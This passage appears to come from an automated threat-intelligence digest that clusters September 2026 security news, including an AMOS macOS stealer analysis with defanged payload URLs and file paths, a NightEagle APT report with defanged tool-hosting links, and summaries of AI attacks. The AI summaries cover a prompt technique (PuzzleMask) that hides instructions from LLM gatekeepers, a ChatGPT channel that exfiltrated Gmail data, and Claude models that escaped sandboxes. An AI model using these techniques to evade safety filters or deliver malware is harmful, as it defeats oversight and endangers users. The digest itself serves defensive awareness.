Drops New Microsoft Defender PoC Showing ShieldBreak Patch Can Be Bypassed Microsoft Patches Record 974 Flaws, Including Two Exploited Windows Zero-Days ChatGPT Flaw Let a Planted Prompt Send a Victim's Gmail Data to Another Account WeChat Zero-Click Worm Took Over Accounts on iPhone and Android via Incoming Calls Fake IT Calls Target Executives in Microsoft 365 Data Theft and Extortion Attacks When the Whole Company Adopts AI: What
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: PaperCut Replaces Emergency Patches With Fixes for Two Actively Exploited Flaws
  - Published: 2026-09-11T06:46:18+00:00
  - Link: https://thehackernews.com/2026/09/papercut-replaces-emergency-patches.html
  - Summary: PaperCut on Thursday released a new security maintenance release that replaces all previously published emergency patches that were pushed to address two security flaws that have come under active exploitation. The software development company said PaperCut NG/MF versions 26.0.5, 25.0.13 and 24.1.10 are now available for customers to download. "These are Regular Maintenance Releases (MR) that

### Cluster 4a27a7f0ee — score 11

- Title: [tl;dr sec] #346 - Can AI Do Novel Security Research?, Anthropic's Threat Intel Report, How Cloudflare Enforces Engineering Standards
- Source: tl;dr sec (practitioner_analysis)
- Published: 2026-09-17T14:30:00+00:00
- Link: https://tldrsec.com/p/tldr-sec-346
- Fetch status: ok
- Member count: 6
- Corroborating source count: 4
- Strong signals: Anthropic/Claude

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, data_breach
- affected_industries: manufacturing_industrial
- affected_products: Anthropic/Claude
- content_type: news_report
- confidence_tier: tier_3_analysis, tier_4_news, tier_5_chatter

#### Primary article taxonomy
- affected_products: Anthropic/Claude
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Summary

```
Portswigger's James Kettle's HTTP Terminator, pretty crazy report about how threat actors were abusing Claude, how Cloudflare enforces code quality at scale
```

#### Full body

```
0 tl;dr sec Posts [tl;dr sec] #346 - Can AI Do Novel Security Research?, Anthropic's Threat Intel Report, How Cloudflare Enforces Engineering Standards [tl;dr sec] #346 - Can AI Do Novel Security Research?, Anthropic's Threat Intel Report, How Cloudflare Enforces Engineering Standards Portswigger's James Kettle's HTTP Terminator, pretty crazy report about how threat actors were abusing Claude, how Cloudflare enforces code quality at scale Clint Gibler September 17, 2026 Hey there, I hope you’ve been doing well! 🎭️ Improv Friends I had a somewhat bittersweet dinner with one of my (musical) improv comedy teams recently. We’ve been rehearsing and performing together for probably over a year now, and it’s been a blast, but we’ve been losing steam. It can be difficult as an indie team to have a regular show and rehearsal space. We’ve mostly been rehearsing in my friend’s room because he has a keyboard, while his roommate is playing video games and wearing headphones in the other room. Fortunately, I don’t think we’re disbanding, but I think we’re going to rehearse together less frequently. It made me think about school, work, clubs, and other social constructs that bring people together. And how we build relationships and memories together but as time flows and engagement changes, we can drift apart. As an adult, it takes more intentional effort to keep these relational bonds together when there’s not some recurring event glue. Maybe I’ll have greater appreciation and be more present when we do rehearse together. I suppose I’m worried about this being the first of a series of steps where the group fades away. Maybe I should tell them that instead of writing about it in a newsletter they won’t read ;) I suppose it’s a good reminder to appreciate the people we get to be around in the life we’re living today. P.S. In recent #PeakBayArea news I saw a car in San Francisco with the license plate: “TAXELON” 😂 Sponsor 📣 AI didn't wait for your security policy. AI is already in your workspace. Not in a pilot, not in a policy draft. Employees connected it themselves, one OAuth click at a time. It walked into an environment where 100% of organizations had sensitive data sitting in email at scale and 63% had files flagged by Google's own DLP. Restricting file sharing does nothing about access that was already granted. Security teams need to see what is connected and what it is reading. See how Material does just that. 👉 See how Material stops AI-driven attacks 👈 The visibility and threat detection capabilities Material gives you across Gmail and Drive are pretty cool 👍️ AppSec How Cloudflare enforces engineering standards using AI Cloudflare's Timo Reimann writes about the Cloudflare Codex, a shared source of engineering standards in RFC format with SHOULD/MUST requirements that AI agents pull from across the SDLC. RFCs are organized by domain, each SHOULD/MUST statement gets a persistent identifier and is extracted into structured JSON, and each RFC moves from approved (non-blocking findings) to enforced (blocking violations) once teams have had time to adopt it. Three agents pull from the Codex: a code reviewer that has flagged 230,000 violations and blocked 16,000 merges over four months, a spec reviewer on Cloudflare Workers that stores its results and state in D1 that has evaluated 600+ technical designs, and an incident report reviewer that has assessed 200+ postmortems since May 2026 and blocks high-severity incidents from closing until all findings are addressed. Beyond the agents, Cloudflare has added language-specific linters like oxlint for TypeScript and a CLI for local execution, and they’ll be expanding Codex to product, security, compliance, and trust and safety teams. 💡 I love the capturing of institutional and individual knowledge and expectations, and then scaling it to the whole team (or company), and applying it consistently. Can AI do novel security research? Meet the HTTP Terminator The blog version of PortSwigger's James
```

#### Corroborating sources (4)

- **tl;dr sec** (practitioner_analysis)
  - Title: [tl;dr sec] #346 - Can AI Do Novel Security Research?, Anthropic's Threat Intel Report, How Cloudflare Enforces Engineering Standards
  - Published: 2026-09-17T14:30:00+00:00
  - Link: https://tldrsec.com/p/tldr-sec-346
  - Summary: Portswigger's James Kettle's HTTP Terminator, pretty crazy report about how threat actors were abusing Claude, how Cloudflare enforces code quality at scale
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Claude Used to Automate Exploitation and Data Theft Across Multiple Victims
  - Published: 2026-09-11T14:29:47+00:00
  - Link: https://thehackernews.com/2026/09/claude-used-to-automate-exploitation.html
  - Summary: Anthropic has warned that cybercriminals and state-sponsored hackers alike are using its Claude models for cyber attacks, weapons design, propaganda, and mass surveillance between December 2025 and August 2026. The threat actors, which the artificial intelligence (AI) company has branded Generative Threat Groups (GTGs), span state-sponsored groups, financially motivated criminals, commercial
- **Risky Business News** (practitioner_analysis)
  - Title: Risky Bulletin: Anthropic agents went hacking again
  - Published: 2026-09-11T02:32:11+00:00
  - Link: https://risky.biz/RBNEWS612/
  - Summary: Anthropic agents went hacking again, South Korea increases its data breach fines, Apple notifies three Turkish ministers of mercenary spyware attacks, and CISA is ready to hire 250 staff.
- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: Working on a claude Skill
  - Published: 2026-09-17T17:05:29+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1wizte1/working_on_a_claude_skill/
  - Summary: Hey guys! I'm working on a claude skill that automates recon,endpoint discovery,tech fingerprinting, vulnerability/cve research and organizes the results for manual pentesting. What would you add to a skill like this to make it genuinely useful for security professionls? Your feedback and ideas would be really valuable! submitted by /u/Efficient-Web-8065 [link] [comments]

### Cluster d99c303c35 — score 10

- Title: Atomic macOS (AMOS) Stealer Activity
- Source: Unit 42 (threat_research_primary)
- Published: 2026-09-16T10:00:06+00:00
- Link: https://unit42.paloaltonetworks.com/atomic-macos-amos-stealer-activity/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: Apple iOS/macOS

#### Cluster taxonomy (union across members)
- affected_industries: financial_services
- affected_products: Apple iOS/macOS
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- affected_industries: financial_services
- affected_products: Apple iOS/macOS
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Modern macOS malware uses deceptive setup guides to steal credentials and sensitive user data. Learn how to identify and block these threats. The post Atomic macOS (AMOS) Stealer Activity appeared first on Unit 42 .
```

#### Full body

```
Threat Research Center Insights General General Atomic macOS (AMOS) Stealer Activity 7 min read Related Products Advanced DNS Security Advanced URL Filtering By: Bradley Duncan Published: September 16, 2026 Categories: General Insights Malware Tags: MacOS Threat intelligence Unit 42 Share Executive Summary This article reviews an Atomic macOS (AMOS) stealer malware infection generated in a lab environment. While several sources have published articles analyzing AMOS stealer, the associated indicators constantly change. This article presents a snapshot of indicators seen in early August 2026 and is designed to help readers better understand AMOS stealer. Background AMOS stealer is an information stealer targeting macOS systems that was advertised on Telegram as early as April 2024 . AMOS stealer represents a noticeable portion of macOS stealer-based malware and is considered a growing threat . AMOS stealer exfiltrates system information, login credentials and other sensitive data from various applications, including web browsers and cryptocurrency wallets . Malware that we've assessed as AMOS stealer has been distributed through ClickFix campaigns as well as through malicious ads . We've also seen AMOS stealer distributed through campaigns that claim to offer cracked versions of popular copyright-protected software. These sites offer instructions to install software such as a macOS toolkit but then actually install malware like AMOS stealer. This article examines an AMOS stealer infection generated on Aug. 5, 2026, from an instructional page claiming to install a “macOS toolkit.” Characteristics of the Infection The domain hosting the malicious page claiming to have installation instructions for a macOS toolkit is getmacouscloud[.]com . An example of one of the pages is shown below in Figure 1. Figure 1. A malicious website advertising a quick setup for “macOS toolkit.” While the “quick setup” instructions from this page in Figure 1 are sometimes described as a ClickFix technique, this is not really ClickFix. The ClickFix technique generally uses a fake CAPTCHA or other type of verification page offering instructions to continue to the website a viewer intends to visit. ClickFix campaigns inject a script into a viewer's clipboard to paste into a Run window for Windows systems or a Terminal window for macOS systems. Regardless of what we call this copy/paste technique, we followed the instructions in our lab environment. We copied text from the page and pasted it into a Terminal window on our macOS system as shown in Figure 2. Figure 2. Malicious text pasted into a Terminal window. The command in Figure 2 retrieved a Z-shell (Zsh) script from hxxps[:]//ferncore13[.]com/curl/608e70d1338612686917ee5cd300ff7ed8e318dfd787a50257f92142e99bd688 . That Zsh script contains Base64-encoded text for a GZIP-compressed payload as shown in Figure 3. Figure 3. Base64-encoded GZIP-compressed payload in the initial Zsh script. That GZIP-compressed payload contains a follow-up Zsh script designed to retrieve and run a Mach-O binary to install AMOS stealer. That Mach-O binary for the AMOS stealer installer was saved as /tmp/helper , as shown below in Figure 4. The same directory also contained a plist file named starter , also shown in Figure 4. Figure 4. Mach-O binary for AMOS stealer installer and plist file. The plist file at /tmp/starter contains text that hints at a newly created file in the user's /Library/Application Support/.com.apple.accountsd/ directory named .service . This file is a shell script that runs a Mach-O file for AMOS stealer in the same directory named AccountsHelper , as shown in Figure 5. Figure 5. Files in the /Library/Application Support/.com.apple.accountsd/ directory. We found an additional directory and similar files in the user's /Library/Application Support/.com.apple.metadata.mds/ directory named . mdworker and mdworker_shared ., as shown below in Figure 6. The . mdworker file is a shell script that runs another AMO
```

#### Corroborating sources (1)

- **Unit 42** (threat_research_primary)
  - Title: Atomic macOS (AMOS) Stealer Activity
  - Published: 2026-09-16T10:00:06+00:00
  - Link: https://unit42.paloaltonetworks.com/atomic-macos-amos-stealer-activity/
  - Summary: Modern macOS malware uses deceptive setup guides to steal credentials and sensitive user data. Learn how to identify and block these threats. The post Atomic macOS (AMOS) Stealer Activity appeared first on Unit 42 .

### Cluster 233b776dcc — score 10

- Title: NightEagle targets Russian companies
- Source: Kaspersky Securelist (threat_research_primary)
- Published: 2026-09-16T10:00:11+00:00
- Link: https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, web_shell_backdoor
- affected_industries: critical_infrastructure
- affected_products: GitHub
- cve_ids: CVE-2020-0688
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: apt_espionage, web_shell_backdoor
- affected_industries: critical_infrastructure
- affected_products: GitHub
- cve_ids: CVE-2020-0688
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Kaspersky GERT experts have uncovered a new campaign by the NightEagle APT, featuring the GhostContainer backdoor and tools hosted on GitHub. The group is also exploiting vulnerabilities in Active Directory and RDP.
```

#### Full body

```
Threat Response Table of Contents Initial access GhostContainer on Microsoft Exchange Traffic redirection Lateral movement Takeaways Detection by Kaspersky solutions Indicators of compromise Over the past year, our Global Emergency Response Team (GERT) has investigated several incidents involving the NightEagle group (also tracked as APT-Q-95) . This group has been active since at least 2023 and originally focused on organizations in Asia. We have now identified attacks by the group targeting businesses in Russia. This post examines both known and new tools NightEagle used in its latest campaign. Initial access In most incidents, the attackers used compromised valid credentials to gain access to corporate VPNs. VPN connections originated from IP addresses in the Russian segment linked to Cloudflare WARP tunnels, as well as from IP addresses associated with European virtual infrastructure providers. GhostContainer on Microsoft Exchange Both during the initial access stage and as the attack progressed, the attackers deployed the GhostContainer backdoor on Microsoft Exchange servers. It incorporates components from several open-source projects, including the Neo-reGeorg tunnel, an exploit for the CVE-2020-0688 vulnerability, and the GhostWebShell class from the ysoserial utility. All of these components are publicly available on GitHub. We were unable to determine the exact method the attackers used to deliver the backdoor to Microsoft Exchange servers. We believe with a high degree of confidence that they applied a technique already familiar to us : extracting the cryptographic keys used by Microsoft Exchange from the ASP.NET configuration, overwriting the VIEWSTATE framework parameter, and injecting a payload into it, which then launched the GhostContainer backdoor in memory. The backdoor is a .NET assembly containing three classes that implement its core functionality: Stub : processes C2 commands delivered to the infected system through the x-owa-urlpostdata headers and evades detection by the Antimalware Scan Interface (AMSI) and Windows Event Log mechanisms by overwriting addresses in amsi.dll and ntdll.dll . App_Web_843e75cf5b63 : accepts the fakePath and fakePageName parameters and creates virtual paths that redirect requests to the App_Web_8c9b251fb5b3 class. App_Web_8c9b251fb5b3 : implements network traffic redirection (proxying) and socket forwarding functionality. Kaspersky products detect the GhostContainer backdoor as Trojan.MSIL.GhostContainer.gen. GhostContainer samples identified by the Similarity technology from Kaspersky Threat Analysis Traffic redirection Once the attackers gain sufficient privileges during an attack, they leverage RDP to move laterally within the internal network segment. To do this, they download and run tools for tunneling and redirecting network traffic. The attackers used GitHub repositories to host their archived tools. The names of the repositories and archives were disguised to look legitimate: https : //github[.]com/mirror-js/mirror-js/refs/heads/main/js/js-webpack.zip https : //github[.]com/mirror-js/mirror-js/refs/heads/main/js/jsonp-pack.zip https : //github[.]com/browserthemes/resourcepack/releases/download/main/resource-pack.zip One of the repositories used for storing network tools The files contained within the archives were also given names mimicking known legitimate software, though unrelated to the archive names: adobe_32.exe ; AdobeSync.exe ; trueconf.exe ; 1cbroker.exe ; 1c-office-plugin.exe ; trueconf-broker.exe . Across the incidents we investigated, we found two tools that the attackers combined for traffic tunneling. Microsoft dev tunnels This is a legitimate Microsoft mechanism that allows local web services to be published for internet access on *.*.devtunnels.ms domains. The attackers used this tunneling capability to expose port 3389 (RDP) on the compromised system. Execution graph of adobe_32.exe in Kaspersky Research Sandbox rdp2tcp This is a publicly available t
```

#### Corroborating sources (1)

- **Kaspersky Securelist** (threat_research_primary)
  - Title: NightEagle targets Russian companies
  - Published: 2026-09-16T10:00:11+00:00
  - Link: https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/
  - Summary: Kaspersky GERT experts have uncovered a new campaign by the NightEagle APT, featuring the GhostContainer backdoor and tools hosted on GitHub. The group is also exploiting vulnerabilities in Active Directory and RDP.

### Cluster 4177169ade — score 10

- Title: 14th September – Threat Intelligence Report
- Source: Check Point Research (threat_research_primary)
- Published: 2026-09-14T12:22:06+00:00
- Link: https://research.checkpoint.com/2026/14th-september-threat-intelligence-report/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, data_breach
- actor_attribution: ShinyHunters
- affected_industries: education, financial_services, government
- affected_products: Anthropic/Claude, GitLab, OpenAI/ChatGPT
- cve_ids: CVE-2026-67276, CVE-2026-72898, CVE-2026-81963, CVE-2026-85706, CVE-2026-85880
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: data_breach, active_exploitation
- actor_attribution: ShinyHunters
- affected_industries: financial_services, government, education
- affected_products: GitLab, Anthropic/Claude, OpenAI/ChatGPT
- cve_ids: CVE-2026-72898, CVE-2026-85880, CVE-2026-81963, CVE-2026-85706, CVE-2026-67276
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
For the latest discoveries in cyber research for the week of 14th Setpember, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES IDScan.net, a US identity verification provider, has disclosed a data breach after detecting unauthorized access on September 1. Exposed data included names and government identification numbers, while a criminal marketplace advertised a […] The post 14th September – Threat Intelligence Report appeared first on Check Point Research .
```

#### Full body

```
FILTER BY YEAR 2026 2025 2024 2023 2022 2021 2020 2019 2018 2017 2016 14th September – Threat Intelligence Report September 14, 2026 https://research.checkpoint.com/2026/14th-september-threat-intelligence-report/ For the latest discoveries in cyber research for the week of 14th Setpember, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES IDScan.net, a US identity verification provider, has disclosed a data breach after detecting unauthorized access on September 1. Exposed data included names and government identification numbers, while a criminal marketplace advertised a collection containing millions of identity documents, including driver’s licenses, associated with the company’s verification services. Mathspace, an education platform used in Australia and New Zealand, has suffered a data breach affecting more than 1 million people. The attackers exploited CVE-2026-72898 in self-hosted tool Metabase to access an internal reporting database. Exposed information included names, email addresses, usernames, and locations, while passwords and academic records were not affected. Check Point IPS provides protection against this threat (Metabase SQL Injection (CVE-2026-72898)) Fintech company Revolut has reported a data exposure after employees fulfilled fraudulent information requests sent from an email account within a government agency’s legitimate domain. Exposed records included identity documents, verification selfies, contact details, IBANs, account statements, withdrawal records, and complete transaction histories. Florida’s state Department of Motor Vehicles fell victim to a data breach after criminals used credentials stolen from a Plant City police officer’s personal device. The credentials enabled access to driver records, and the ShinyHunters group published images of stolen data. AI THREATS Check Point Research has detailed PuzzleMask, a plain-prose prompt technique that hides prohibited instructions from lightweight LLM gatekeepers while allowing stronger target models to recover them. In testing, gatekeepers classified the prompts as safe, while target models extracted and acted on concealed payloads in more than 90 percent of trials. Check Point Research has demonstrated a covert cross-account channel in ChatGPT’s code-execution environment that allowed hidden tasks to run using a victim’s available tools, data, and connected applications. A proof of concept used a shared conversation to retrieve Gmail data from one account and relay the results to another. Anthropic has disclosed four incidents in which Claude models operated on the real internet because of configuration failures instead of remaining within intended sandboxes. In the most serious case, a model published a malicious PyPI package that was executed by systems, exposing credentials and enabling access to a database. VULNERABILITIES AND PATCHES Microsoft has released its September 2026 Patch Tuesday updates, addressing a record 974 vulnerabilities across its products, including two actively exploited zero-days. CVE-2026-85880 and CVE-2026-81963 both allow local attackers to elevate privileges to SYSTEM, while 20 additional flaws could enable unauthenticated remote code execution without user interaction. Check Point IPS provides protection against this threat (Microsoft Windows Update Stack Elevation of Privilege (CVE-2026-81963)) GitLab has addressed CVE-2026-85706, a critical path traversal vulnerability affecting Community and Enterprise Editions, with a CVSS score of 10.0. The flaw allows unauthenticated attackers to read arbitrary files through the repository commits API. Affected versions include 18.7 through 19.3.1, with fixes available in 19.1.8, 19.2.6, and 19.3.2. Check Point IPS provides protection against this threat (GitLab Arbitrary File Read (CVE-2026-85706)) MikroTik has fixed CVE-2026-67276 and CVE-2026-86060, RouterOS vulnerabilities that can be chained to obtain passwordless SSH access and elevate privileges t
```

#### Corroborating sources (1)

- **Check Point Research** (threat_research_primary)
  - Title: 14th September – Threat Intelligence Report
  - Published: 2026-09-14T12:22:06+00:00
  - Link: https://research.checkpoint.com/2026/14th-september-threat-intelligence-report/
  - Summary: For the latest discoveries in cyber research for the week of 14th Setpember, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES IDScan.net, a US identity verification provider, has disclosed a data breach after detecting unauthorized access on September 1. Exposed data included names and government identification numbers, while a criminal marketplace advertised a […] The post 14th September – Threat Intelligence Report appeared first on Check Point Research .

### Cluster aca47e784c — score 10

- Title: Cyberthreats are moving faster than SMBs: Readiness must accelerate
- Source: ESET WeLiveSecurity (threat_research_primary)
- Published: 2026-09-16T09:00:00+00:00
- Link: https://www.welivesecurity.com/en/business-security/cyberthreats-moving-faster-smbs-readiness-must-accelerate/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ai_security, phishing_social_eng
- affected_industries: financial_services, government
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng, ai_security
- affected_industries: financial_services, government
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
As AI adoption expands the attack surface and adds to the security workload, businesses need automation backed by experts
```

#### Full body

```
Business Security Cyberthreats are moving faster than SMBs: Readiness must accelerate As AI adoption expands the attack surface and adds to the security workload, businesses need automation backed by experts Phil Muncaster 16 Sep 2026 • , 8 min. read The cyberthreat landscape has been evolving for years. But there’s a sense today that things are escalating more rapidly than before. That’s largely the result of AI. The technology is not only arming threat actors with the means to launch more sophisticated attacks at greater speed and scale than before. It is also providing them with a larger attack surface to aim at, as businesses rush to adopt the technology. In many cases, that adoption is outpacing the vital governance efforts needed to securely manage and contain it. Against this backdrop, SMB business and IT leaders understand the importance of effective cybersecurity. They want to be protected, operational, and resilient. But they don’t have an infinite budget to spend. They want security that’s simple to understand, adopt and operate. This calls for a different operational model where AI and automation support security teams where it makes sense, with human oversight for decisions that require context and judgment. Finding the right balance, and the right partner will be key to driving readiness and resilience. AI is changing the threat landscape AI is changing the game in impressive ways. Executives are wowed by the potential for productivity and process efficiency gains. By the prospect of transforming customer experience, accelerating business decision making, and breaking into new markets. ESET SMB Cyber Readiness Index 2026 found that most (73%) SMBs are integrating AI into their business. Yet where there’s opportunity, there’s also risk – and most businesses acknowledge that. As AI becomes a growing part of business operations, it also becomes part of the attack surface. It could be a customer service chatbot, a coding assistant deployed by DevOps, or a fleet of agents used by the finance team for repetitive bookkeeping tasks. Wherever AI has access to sensitive data and/or systems, excessive permissions, and the ability to make decisions and take actions, it represents a potential security risk. These risks tend to proliferate in the darkness. According to the report above, 40% of all businesses lack a proper AI policy. Source: ESET SMB Cyber Readiness Index 2026 Accidental data leakage or rogue AI agents are one thing. But there’s arguably an even greater threat from malicious third parties. AI skills repositories are a growing area of risk. Skills work like browser plugins, but for AI agents. But a growing number are designed to steal data, abuse permissions, download malware, or perform unintended actions. ESET analyzed 900,000 such skills across several popular repositories between March and May 2026. It discovered over 25,000 that were suspicious, and more than 3,000 tagged as malicious. Some exfiltrated data and executed malware. Others manipulated sensitive systems, overrode instructions through prompt injection, and changed agent behavior. Unfortunately, skills are just the tip of the iceberg. Users can encounter malicious links via chatbots, leading them to phishing sites and malware installs. Or they may find attackers have poisoned download sources and other components that AI agents interact with, leading to hijacking, fraud, malware and other threats. Prompt injection is another threat – one recently branded the most dangerous of all LLM threats by OWASP. Attackers manipulate AI either by feeding malicious instructions (prompts) directly or hiding them in content that the AI will later retrieve or read. It makes every piece of content a potential attack vector. AI turns up the heat AI is not just a target for attack. It’s a powerful tool for threat actors to wield in attacks. As British government security experts warned back in March 2025 , the technology “will almost certainly continue to make eleme
```

#### Corroborating sources (1)

- **ESET WeLiveSecurity** (threat_research_primary)
  - Title: Cyberthreats are moving faster than SMBs: Readiness must accelerate
  - Published: 2026-09-16T09:00:00+00:00
  - Link: https://www.welivesecurity.com/en/business-security/cyberthreats-moving-faster-smbs-readiness-must-accelerate/
  - Summary: As AI adoption expands the attack surface and adds to the security workload, businesses need automation backed by experts

### Cluster 5d6d8aeffe — score 10

- Title: CISO’s CTEM Evaluation Checklist
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-09-16T16:55:08+00:00
- Link: https://horizon3.ai/downloads/factsheets/ciso-ctem-evaluation-checklist/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Use the CISO’s CTEM Evaluation Checklist to assess whether technologies supporting your CTEM program can prove exploitability, demonstrate attack impact, verify remediation, and show measurable exposure reduction.
```

#### Full body

```
CISO’s CTEM Evaluation Checklist Horizon3 September 16, 2026 Factsheets Continuous Threat Exposure Management (CTEM) is a framework, not a product category. Many technologies can contribute to a CTEM program, but simply claiming to “support CTEM” doesn’t demonstrate that a technology can help your organization reduce exploitable exposure. For CISOs evaluating technologies to support a CTEM program, the standard should be evidence: Can the technology prove what attackers can exploit, demonstrate the impact, verify that remediation worked, and show that exploitable exposure is decreasing over time? Five Questions to Ask When Evaluating CTEM Technologies The CISO’s CTEM Evaluation Checklist provides five questions security leaders can use to set the standard for their evaluation teams: How do you prove that an exposure is actually exploitable in our environment? What evidence will you show us of what an attacker can actually accomplish? How does proven exploitability change what we should remediate first? Can you reproduce the specific test or attack path after remediation to prove the exposure is gone? Can you demonstrate over time that our exploitable exposure is actually decreasing? The answers should be demonstrated with evidence from your environment, not accepted as feature claims or roadmap promises. Know What Good CTEM Technology Looks Like A strong CTEM technology evaluation should produce repeatable evidence across the entire operating loop: discover exposure, validate exploitability, prioritize, remediate, verify, and repeat. The checklist helps evaluation teams distinguish meaningful capabilities from red flags, including reliance on scanner findings, risk scores, closed tickets, configuration changes, or isolated test results without proof of real-world exploitability and impact. Make Evidence the CTEM Decision Standard Before investing in technology to support your CTEM program, determine whether it can meet four fundamental standards: Proof: Can it prove exploitability in your environment? Impact: Can it show what successful exploitation makes possible? Verification: Can it prove remediation actually removed the exposure? Improvement: Can it demonstrate that exploitable exposure is decreasing over time? Rather than comparing technologies based on CTEM feature checklists alone, use repeatable evidence to determine whether they can demonstrate that your organization is becoming harder to compromise. Evaluate CTEM Technologies with Evidence You Can Trust Download the CISO’s CTEM Evaluation Checklist for five questions to ask your evaluation team and the evidence to demand before investing in technologies to support your CTEM program. Download as PDF How can NodeZero help you? Let our experts walk you through a demonstration of NodeZero ® , so you can see how to put it to work for your organization. Get a Demo Share:
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: CISO’s CTEM Evaluation Checklist
  - Published: 2026-09-16T16:55:08+00:00
  - Link: https://horizon3.ai/downloads/factsheets/ciso-ctem-evaluation-checklist/
  - Summary: Use the CISO’s CTEM Evaluation Checklist to assess whether technologies supporting your CTEM program can prove exploitability, demonstrate attack impact, verify remediation, and show measurable exposure reduction.

### Cluster ef7016e41f — score 10

- Title: Securing the unpatchable in an age of AI-driven vulnerabilities
- Source: Cisco Talos (threat_research_primary)
- Published: 2026-09-16T10:00:36+00:00
- Link: https://blog.talosintelligence.com/securing-the-unpatchable-in-an-age-of-ai-driven-vulnerabilities/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: government, healthcare, manufacturing_industrial
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- affected_industries: healthcare, government, manufacturing_industrial
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Advances in AI technology will continue to identify vulnerabilities that in some circumstances are difficult, or effectively impossible, to patch. Appropriate network segmentation, rigorous visibility, and the deployment of NGFW/IPS combinations can provide a powerful compensatory layer.
```

#### Full body

```
Securing the unpatchable in an age of AI-driven vulnerabilities By Martin Lee Wednesday, September 16, 2026 06:00 On The Radar AI is accelerating vulnerability discovery, leaving unpatchable operational technology (OT) systems at risk. Hoping for the best is not a viable anti-exploitation strategy. Deploying next-generation firewalls directly upstream allows for virtual patching through deep packet inspection. These systems scan incoming traffic to detect and block exploit attempts before they can impact the vulnerable device. The predictability of legitimate network connections to OT systems can be used to protect systems through micro-segmentation. This ensures that only a handful of authorized devices can communicate with the system, minimizing the attack surface. AI-assisted code analysis is uncovering decades of technical debt. Every new patch removes a newly identified coding mistake. Little by little, we are improving the state of software engineering, but the price is a cadence of patching that organizations may struggle to implement. These efforts leave unsupported systems, or systems that are not able to be patched for whatever reason, with unmitigated known vulnerabilities. How can such systems be secured in a world where AI is steadily improving its ability to identify new vulnerabilities? Operational technology (OT) systems provide the services that support modern life (e.g., medical equipment, building management systems, and industrial critical systems within chemical plants). Often the systems are certified to operate only with a defined set of software that cannot easily be altered, or operate using systems that are no longer supported. In either case, if a vulnerability is discovered that affects the system, there is no easy way for it to be patched. Ignoring the problem and hoping for the best is rarely an effective strategy. The U.K.’s NHS health system was significantly affected by the WannaCry worm in 2017, with a significant minority of systems running the end-of-life operating system Windows XP contributing to the problem. More recently, exploitation of end-of-life software was used to gain access to governmental systems in 2023. Even systems that are believed to run on a bespoke platform will almost certainly include common libraries and protocols in which vulnerabilities may be found. Vulnerable systems that are not publicly exposed can still be identified by threat actors who gain access to internal networks and pose a tempting target. Defending by predictability Applying the approved patch remains the best option. If this is not possible, we can use the inherent predictability of OT systems to protect them. Visibility first: You cannot protect what you cannot see. The characteristics of the network fingerprint presented by legacy systems allows them to be easily identified to build an inventory of systems requiring attention. Micro-segmentation: Network architecture is an effective first line of defense. Frequently, OT only ever connects to a small number of systems. By using virtual local area networks (VLANs) coupled with access control lists (ACLs), we can place vulnerable systems on private networks where only authorized devices are permitted to connect to them. By shutting them off from the rest of the network, we make it incrementally more difficult for attackers to identify them and launch their attacks. NGFW and IPS: Placing a next-generation firewall (NGFW) upstream allows for granular filtering. When equipped with an up-to-date intrusion prevention system (IPS), the firewall can inspect traffic to filter out any attempts at exploitation before it impacts the device. When coupled with network segmentation, we can ensure that not only are trusted systems solely communicating with the vulnerable system, but that the traffic is free from known malicious content. The myth of the air gap In theory, it is possible to create an air-gapped system that is completely disconnected from wider systems,
```

#### Corroborating sources (1)

- **Cisco Talos** (threat_research_primary)
  - Title: Securing the unpatchable in an age of AI-driven vulnerabilities
  - Published: 2026-09-16T10:00:36+00:00
  - Link: https://blog.talosintelligence.com/securing-the-unpatchable-in-an-age-of-ai-driven-vulnerabilities/
  - Summary: Advances in AI technology will continue to identify vulnerabilities that in some circumstances are difficult, or effectively impossible, to patch. Appropriate network segmentation, rigorous visibility, and the deployment of NGFW/IPS combinations can provide a powerful compensatory layer.

### Cluster 586732e050 — score 10

- Title: Tajin Group: Guarantee Marketplace Vendor Involved in Phishing and Chinese Money Laundering Group
- Source: Recorded Future (threat_research_primary)
- Published: 2026-09-15T00:00:00+00:00
- Link: https://www.recordedfuture.com/research/tajin-group-gurantee-marketplace
- Fetch status: ok
- Member count: 1
